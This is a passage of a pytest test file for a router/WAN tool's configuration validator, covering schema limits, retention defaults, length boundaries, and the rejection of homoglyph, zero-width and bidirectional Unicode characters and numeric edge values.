            validate_schema(data, BaseConfig.BASE_SCHEMA)
        assert "out of range" in str(exc_info.value)

    def test_schema_rejects_backup_count_above_10(self):
        """Test schema validation rejects backup_count above 10."""
        data = {
            "wan_name": "test",
            "router": {"host": "1.1.1.1", "user": "admin", "ssh_key": "/k"},
            "logging": {
                "main_log": "/tmp/m.log",
                "debug_log": "/tmp/d.log",
                "backup_count": 11,  # Above maximum 10
            },
            "lock_file": "/tmp/t.lock",
            "lock_timeout": 300,
        }
        with pytest.raises(ConfigValidationError) as exc_info:
            validate_schema(data, BaseConfig.BASE_SCHEMA)
        assert "out of range" in str(exc_info.value)

    def test_default_constants_defined(self):
        """Test default log rotation constants are defined on class."""
        assert BaseConfig.DEFAULT_LOG_MAX_BYTES == 10_485_760
        assert BaseConfig.DEFAULT_LOG_BACKUP_COUNT == 3


# =============================================================================
# Tests for get_storage_config() retention section
# =============================================================================


class TestGetStorageConfigRetention:
    """Tests for extended get_storage_config() with retention section."""

    def test_empty_config_returns_default_retention(self):
        """get_storage_config({}) returns default retention dict."""
        result = get_storage_config({})
        retention = result["retention"]
        assert retention["raw_age_seconds"] == 900
        assert retention["aggregate_1m_age_seconds"] == 86400
        assert retention["aggregate_5m_age_seconds"] == 604800
        assert retention["prometheus_compensated"] is False

    def test_explicit_retention_values(self):
        """get_storage_config with explicit retention values returns those values."""
        data = {
            "storage": {
                "retention": {
                    "raw_age_seconds": 1800,
                    "aggregate_1m_age_seconds": 43200,
                    "aggregate_5m_age_seconds": 259200,
                }
            }
        }
        result = get_storage_config(data)
        retention = result["retention"]
        assert retention["raw_age_seconds"] == 1800
        assert retention["aggregate_1m_age_seconds"] == 43200
        assert retention["aggregate_5m_age_seconds"] == 259200

    def test_partial_retention_uses_defaults(self):
        """get_storage_config with partial retention fills defaults for the rest."""
        data = {
            "storage": {
                "retention": {
                    "aggregate_5m_age_seconds": 172800,
                }
            }
        }
        result = get_storage_config(data)
        retention = result["retention"]
        assert retention["aggregate_5m_age_seconds"] == 172800
        assert retention["raw_age_seconds"] == 900  # default
        assert retention["aggregate_1m_age_seconds"] == 86400  # default

    def test_deprecated_retention_days_translates(self):
        """get_storage_config with retention_days translates to new retention section."""
        data = {"storage": {"retention_days": 14}}
        result = get_storage_config(data)
        retention = result["retention"]
        assert retention["aggregate_5m_age_seconds"] == 1209600  # 14 * 86400
        assert retention["raw_age_seconds"] == 900  # default
        assert retention["aggregate_1m_age_seconds"] == 86400  # default

    def test_retention_days_ignored_when_retention_present(self):
        """retention_days is ignored when new retention section present."""
        data = {
            "storage": {
                "retention_days": 14,
                "retention": {
                    "aggregate_5m_age_seconds": 259200,
                },
            }
        }
        result = get_storage_config(data)
        retention = result["retention"]
        # New key takes precedence per deprecate_param semantics
        assert retention["aggregate_5m_age_seconds"] == 259200

    def test_prometheus_compensated_defaults(self):
        """prometheus_compensated=True sets aggressive defaults."""
        data = {
            "storage": {
                "retention": {
                    "prometheus_compensated": True,
                }
            }
        }
        result = get_storage_config(data)
        retention = result["retention"]
        assert retention["aggregate_1m_age_seconds"] == 86400  # 24h
        assert retention["aggregate_5m_age_seconds"] == 172800  # 48h
        assert retention["prometheus_compensated"] is True

    def test_prometheus_compensated_explicit_override(self):
        """Explicit override wins over prometheus_compensated defaults."""
        data = {
            "storage": {
                "retention": {
                    "prometheus_compensated": True,
                    "aggregate_5m_age_seconds": 259200,
                }
            }
        }
        result = get_storage_config(data)
        retention = result["retention"]
        assert retention["aggregate_5m_age_seconds"] == 259200  # explicit wins

    def test_storage_schema_has_retention_entries(self):
        """STORAGE_SCHEMA includes retention field entries."""
        paths = [entry["path"] for entry in STORAGE_SCHEMA]
        assert "storage.retention.raw_age_seconds" in paths
        assert "storage.retention.aggregate_1m_age_seconds" in paths
        assert "storage.retention.aggregate_5m_age_seconds" in paths
        assert "storage.retention.prometheus_compensated" in paths

    def test_backward_compat_retention_days_key(self):
        """Return dict still includes retention_days for backward compat."""
        result = get_storage_config({})
        assert "retention_days" in result
        # Default 5m age is 604800 = 7 * 86400
        assert result["retention_days"] == 7

    def test_db_path_still_returned(self):
        """Return dict still includes db_path."""
        result = get_storage_config({})
        assert "db_path" in result


# =============================================================================
# MERGED FROM test_config_edge_cases.py
# =============================================================================


# =============================================================================
# Boundary Length Tests
# =============================================================================


class TestBoundaryLengths:
    """Tests for exact boundary length validation."""

    # -------------------------------------------------------------------------
    # validate_identifier boundaries (max 64 chars)
    # -------------------------------------------------------------------------

    def test_identifier_63_chars_valid(self):
        """Test identifier at 63 chars (under limit) is valid."""
        name = "a" * 63
        result = BaseConfig.validate_identifier(name, "test_field")
        assert result == name
        assert len(result) == 63

    def test_identifier_64_chars_valid(self):
        """Test identifier at exactly 64 chars (at limit) is valid."""
        name = "a" * 64
        result = BaseConfig.validate_identifier(name, "test_field")
        assert result == name
        assert len(result) == 64

    def test_identifier_64_chars_with_valid_pattern(self):
        """Test 64-char identifier with realistic pattern is valid."""
        # Realistic queue name pattern at exactly 64 chars
        name = "WAN-Download-Queue-Primary-Connection-Link-001-Bandwidth-Limit01"
        assert len(name) == 64
        result = BaseConfig.validate_identifier(name, "queue_name")
        assert result == name

    def test_identifier_65_chars_invalid(self):
        """Test identifier at 65 chars (over limit) is invalid."""
        name = "a" * 65
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_identifier(name, "test_field")
        assert "too long" in str(exc_info.value)
        assert "65 chars" in str(exc_info.value)

    # -------------------------------------------------------------------------
    # validate_comment boundaries (max 128 chars)
    # -------------------------------------------------------------------------

    def test_comment_127_chars_valid(self):
        """Test comment at 127 chars (under limit) is valid."""
        comment = "A" * 127
        result = BaseConfig.validate_comment(comment, "test_field")
        assert result == comment
        assert len(result) == 127

    def test_comment_128_chars_valid(self):
        """Test comment at exactly 128 chars (at limit) is valid."""
        comment = "A" * 128
        result = BaseConfig.validate_comment(comment, "test_field")
        assert result == comment
        assert len(result) == 128

    def test_comment_128_chars_with_valid_pattern(self):
        """Test 128-char comment with realistic pattern is valid."""
        # Realistic mangle comment at exactly 128 chars
        comment = "ADAPTIVE: Steer latency-sensitive traffic to alternate WAN when primary congested - Rule for gaming and video calls traffic"
        # Pad to exactly 128
        comment = comment + " " * (128 - len(comment))
        assert len(comment) == 128
        result = BaseConfig.validate_comment(comment, "mangle_comment")
        assert result == comment

    def test_comment_129_chars_invalid(self):
        """Test comment at 129 chars (over limit) is invalid."""
        comment = "A" * 129
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_comment(comment, "test_field")
        assert "too long" in str(exc_info.value)
        assert "129 chars" in str(exc_info.value)

    # -------------------------------------------------------------------------
    # validate_ping_host boundaries (max 256 chars)
    # -------------------------------------------------------------------------

    def test_ping_host_255_chars_valid(self):
        """Test ping host at 255 chars (under limit) is valid."""
        # Build a valid hostname at 255 chars using labels
        # Each label can be up to 63 chars, separated by dots
        # 63 + 1 + 63 + 1 + 63 + 1 + 63 = 255
        host = "a" * 63 + "." + "b" * 63 + "." + "c" * 63 + "." + "d" * 63
        assert len(host) == 255
        result = BaseConfig.validate_ping_host(host, "ping_host")
        assert result == host

    def test_ping_host_256_chars_valid(self):
        """Test ping host at exactly 256 chars (at limit) is valid."""
        # 63 + 1 + 63 + 1 + 63 + 1 + 62 + 1 + 1 = 256 (each label max 63 chars per RFC)
        host = "a" * 63 + "." + "b" * 63 + "." + "c" * 63 + "." + "d" * 62 + "." + "e"
        assert len(host) == 256
        result = BaseConfig.validate_ping_host(host, "ping_host")
        assert result == host

    def test_ping_host_257_chars_invalid(self):
        """Test ping host at 257 chars (over limit) is invalid."""
        host = "a" * 63 + "." + "b" * 63 + "." + "c" * 63 + "." + "d" * 63 + "ef"
        assert len(host) == 257
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_ping_host(host, "ping_host")
        assert "too long" in str(exc_info.value)

    # -------------------------------------------------------------------------
    # Hostname label length boundary (max 63 chars per label)
    # -------------------------------------------------------------------------

    def test_hostname_label_63_chars_valid(self):
        """Test hostname label at exactly 63 chars is valid."""
        label = "a" * 63
        host = f"{label}.com"
        result = BaseConfig.validate_ping_host(host, "ping_host")
        assert result == host

    def test_hostname_label_64_chars_invalid(self):
        """Test hostname label at 64 chars (over label limit) is invalid."""
        label = "a" * 64
        host = f"{label}.com"
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_ping_host(host, "ping_host")


# =============================================================================
# Unicode Edge Case Tests
# =============================================================================


class TestUnicodeEdgeCases:
    """Tests for Unicode-based attacks on validation."""

    # -------------------------------------------------------------------------
    # Homograph attacks (visually similar characters)
    # -------------------------------------------------------------------------

    def test_cyrillic_a_rejected(self):
        """Test Cyrillic 'а' (U+0430) that looks like ASCII 'a' is rejected."""
        # Cyrillic small letter a looks identical to ASCII a
        name = "v\u0430lid"  # 'valid' with Cyrillic а
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_identifier(name, "test")
        assert "invalid characters" in str(exc_info.value)

    def test_cyrillic_o_rejected(self):
        """Test Cyrillic 'о' (U+043E) that looks like ASCII 'o' is rejected."""
        name = "r\u043euter"  # 'router' with Cyrillic о
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_identifier(name, "test")
        assert "invalid characters" in str(exc_info.value)

    def test_cyrillic_e_rejected(self):
        """Test Cyrillic 'е' (U+0435) that looks like ASCII 'e' is rejected."""
        name = "qu\u0435ue"  # 'queue' with Cyrillic е
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_identifier(name, "test")
        assert "invalid characters" in str(exc_info.value)

    def test_fullwidth_letters_rejected(self):
        """Test full-width letters (U+FF21-FF3A) are rejected."""
        name = "\uff21\uff22\uff23"  # Full-width ABC
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_identifier(name, "test")
        assert "invalid characters" in str(exc_info.value)

    def test_greek_omicron_rejected(self):
        """Test Greek 'ο' (U+03BF) that looks like ASCII 'o' is rejected."""
        name = "r\u03bfuter"  # 'router' with Greek omicron
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_identifier(name, "test")
        assert "invalid characters" in str(exc_info.value)

    # -------------------------------------------------------------------------
    # Zero-width characters
    # -------------------------------------------------------------------------

    def test_zero_width_space_rejected(self):
        """Test zero-width space (U+200B) embedded in identifier is rejected."""
        name = "valid\u200bname"  # Zero-width space between 'valid' and 'name'
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_identifier(name, "test")
        assert "invalid characters" in str(exc_info.value)

    def test_zero_width_non_joiner_rejected(self):
        """Test zero-width non-joiner (U+200C) is rejected."""
        name = "valid\u200cname"
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_identifier(name, "test")
        assert "invalid characters" in str(exc_info.value)

    def test_zero_width_joiner_rejected(self):
        """Test zero-width joiner (U+200D) is rejected."""
        name = "valid\u200dname"
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_identifier(name, "test")
        assert "invalid characters" in str(exc_info.value)

    def test_word_joiner_rejected(self):
        """Test word joiner (U+2060) is rejected."""
        name = "valid\u2060name"
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_identifier(name, "test")
        assert "invalid characters" in str(exc_info.value)

    # -------------------------------------------------------------------------
    # Directional override characters (can hide malicious text)
    # -------------------------------------------------------------------------

    def test_rtl_override_rejected(self):
        """Test right-to-left override (U+202E) is rejected."""
        # This character can make text display in reverse order
        name = "valid\u202ename"
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_identifier(name, "test")
        assert "invalid characters" in str(exc_info.value)

    def test_ltr_override_rejected(self):
        """Test left-to-right override (U+202D) is rejected."""
        name = "valid\u202dname"
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_identifier(name, "test")
        assert "invalid characters" in str(exc_info.value)

    def test_rtl_embedding_rejected(self):
        """Test right-to-left embedding (U+202B) is rejected."""
        name = "valid\u202bname"
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_identifier(name, "test")
        assert "invalid characters" in str(exc_info.value)

    def test_ltr_embedding_rejected(self):
        """Test left-to-right embedding (U+202A) is rejected."""
        name = "valid\u202aname"
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_identifier(name, "test")
        assert "invalid characters" in str(exc_info.value)

    # -------------------------------------------------------------------------
    # Other Unicode tricks
    # -------------------------------------------------------------------------

    def test_non_breaking_space_rejected(self):
        """Test non-breaking space (U+00A0) is rejected."""
        name = "valid\u00a0name"  # Looks like space but isn't
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_identifier(name, "test")
        assert "invalid characters" in str(exc_info.value)

    def test_combining_characters_rejected(self):
        """Test combining diacritical marks are rejected."""
        # Combining acute accent (U+0301) after 'a' makes á
        name = "va\u0301lid"
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_identifier(name, "test")
        assert "invalid characters" in str(exc_info.value)

    def test_soft_hyphen_rejected(self):
        """Test soft hyphen (U+00AD) is rejected."""
        name = "valid\u00adname"  # Invisible hyphen
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_identifier(name, "test")
        assert "invalid characters" in str(exc_info.value)

    def test_object_replacement_char_rejected(self):
        """Test object replacement character (U+FFFC) is rejected."""
        name = "valid\ufffcname"
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_identifier(name, "test")
        assert "invalid characters" in str(exc_info.value)

    def test_byte_order_mark_rejected(self):
        """Test byte order mark (U+FEFF) is rejected."""
        name = "\ufeffvalidname"  # BOM at start
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_identifier(name, "test")
        assert "invalid characters" in str(exc_info.value)

    # -------------------------------------------------------------------------
    # Unicode in comments (validate_comment also needs protection)
    # -------------------------------------------------------------------------

    def test_comment_cyrillic_rejected(self):
        """Test Cyrillic characters in comments are rejected."""
        comment = "ADAPTIVE: St\u0435er to WAN2"  # Cyrillic е
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_comment(comment, "test")
        assert "invalid characters" in str(exc_info.value)

    def test_comment_zero_width_rejected(self):
        """Test zero-width characters in comments are rejected."""
        comment = "ADAPTIVE:\u200b Steer to WAN2"  # Zero-width space after colon
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_comment(comment, "test")
        assert "invalid characters" in str(exc_info.value)


# =============================================================================
# Numeric Boundary Tests
# =============================================================================


class TestNumericBoundaries:
    """Tests for numeric boundary conditions in validation."""

    # -------------------------------------------------------------------------
    # validate_alpha exact boundaries (0.0 to 1.0)
    # -------------------------------------------------------------------------

    def test_alpha_exactly_zero(self):
        """Test alpha exactly 0.0 (minimum boundary) is valid."""
        result = validate_alpha(0.0, "alpha")
        assert result == 0.0

    def test_alpha_exactly_one(self):
        """Test alpha exactly 1.0 (maximum boundary) is valid."""
        result = validate_alpha(1.0, "alpha")
        assert result == 1.0

    def test_alpha_negative_zero(self):
        """Test alpha -0.0 is valid (equals 0.0)."""
        result = validate_alpha(-0.0, "alpha")
        assert result == 0.0
        # -0.0 equals 0.0 in Python
        assert result == -0.0

    def test_alpha_tiny_below_zero_invalid(self):
        """Test alpha slightly below 0.0 is invalid."""
        with pytest.raises(ConfigValidationError) as exc_info:
            validate_alpha(-1e-10, "alpha")
        assert "not in valid range" in str(exc_info.value)

    def test_alpha_tiny_above_one_invalid(self):
        """Test alpha slightly above 1.0 is invalid."""
        with pytest.raises(ConfigValidationError) as exc_info:
            validate_alpha(1.0 + 1e-10, "alpha")
        assert "not in valid range" in str(exc_info.value)

    def test_alpha_smallest_positive(self):
        """Test smallest positive float is valid."""
        import sys

        smallest = sys.float_info.min
        result = validate_alpha(smallest, "alpha")
        assert result == smallest

    def test_alpha_largest_under_one(self):
        """Test largest float under 1.0 is valid."""
        import math

        # nextafter gives the next representable float
        largest_under_one = math.nextafter(1.0, 0.0)
        result = validate_alpha(largest_under_one, "alpha")
        assert result == largest_under_one

    # -------------------------------------------------------------------------
    # validate_field min/max boundaries
    # -------------------------------------------------------------------------

    def test_field_exactly_at_min(self):
        """Test field value exactly at min_val is valid."""
        data = {"value": 10}
        result = validate_field(data, "value", int, min_val=10)
        assert result == 10

    def test_field_exactly_at_max(self):
        """Test field value exactly at max_val is valid."""
        data = {"value": 100}
        result = validate_field(data, "value", int, min_val=0, max_val=100)
        assert result == 100

    def test_field_one_below_min_invalid(self):
        """Test field value one below min_val is invalid."""
        data = {"value": 9}
        with pytest.raises(ConfigValidationError) as exc_info:
            validate_field(data, "value", int, min_val=10)
        assert "out of range" in str(exc_info.value)
        assert "minimum" in str(exc_info.value)

    def test_field_one_above_max_invalid(self):
        """Test field value one above max_val is invalid."""
        data = {"value": 101}
        with pytest.raises(ConfigValidationError) as exc_info:
            validate_field(data, "value", int, min_val=0, max_val=100)
        assert "out of range" in str(exc_info.value)
        assert "maximum" in str(exc_info.value)

    def test_field_float_exactly_at_min(self):
        """Test float field value exactly at min_val is valid."""
        data = {"value": 0.5}
        result = validate_field(data, "value", float, min_val=0.5)
        assert result == 0.5

    def test_field_float_exactly_at_max(self):
        """Test float field value exactly at max_val is valid."""
        data = {"value": 0.9}
        result = validate_field(data, "value", float, min_val=0.0, max_val=0.9)
        assert result == 0.9

    # -------------------------------------------------------------------------
    # Float special values
    # -------------------------------------------------------------------------

    def test_field_subnormal_float(self):
        """Test subnormal (denormalized) float is handled correctly."""
        import sys

        # Smallest positive subnormal
        subnormal = sys.float_info.min * sys.float_info.epsilon
        data = {"value": subnormal}
        result = validate_field(data, "value", float, min_val=0.0)
        assert result == subnormal

    def test_field_very_large_float(self):
        """Test very large float near max is handled correctly."""
        import sys

        large = sys.float_info.max / 2
        data = {"value": large}
        result = validate_field(data, "value", float, min_val=0.0)
        assert result == large

    def test_field_negative_zero_float(self):
        """Test negative zero is handled correctly."""
        data = {"value": -0.0}
        result = validate_field(data, "value", float, min_val=0.0)
        # -0.0 == 0.0 in Python, so should pass min_val=0.0
        assert result == 0.0

    # -------------------------------------------------------------------------
    # Integer boundary conditions
    # -------------------------------------------------------------------------

    def test_field_zero_with_zero_min(self):
        """Test zero value with min_val=0 is valid."""
        data = {"value": 0}
        result = validate_field(data, "value", int, min_val=0)
        assert result == 0

    def test_field_negative_one_with_zero_min_invalid(self):
        """Test -1 with min_val=0 is invalid."""
        data = {"value": -1}
        with pytest.raises(ConfigValidationError):
            validate_field(data, "value", int, min_val=0)

    def test_field_large_int(self):
        """Test large integer values are handled correctly."""
        large_int = 10**18  # 1 quintillion
        data = {"value": large_int}
        result = validate_field(data, "value", int, min_val=0)
        assert result == large_int

    def test_field_negative_large_int(self):
        """Test large negative integers are handled correctly."""
        large_neg = -(10**18)
        data = {"value": large_neg}
        result = validate_field(data, "value", int, max_val=0)
        assert result == large_neg

